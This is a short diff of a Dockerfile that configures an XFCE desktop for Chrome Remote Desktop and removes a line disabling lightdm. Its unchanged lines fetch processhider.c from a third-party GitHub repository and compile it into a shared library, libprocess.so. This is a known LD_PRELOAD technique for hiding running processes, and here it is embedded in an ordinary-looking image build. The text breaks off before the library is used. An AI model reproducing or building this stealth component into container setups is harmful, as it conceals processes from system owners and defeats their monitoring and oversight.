@@ -14,7 +14,6 @@ RUN apt-get install --assume-yes --fix-broken
 RUN bash -c 'echo \"exec /etc/X11/Xsession /usr/bin/xfce4-session\" > /etc/chrome-remote-desktop-session'
 RUN apt remove --assume-yes gnome-terminal
 RUN apt install --assume-yes xscreensaver
-RUN systemctl disable lightdm.service
 
 RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
 && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
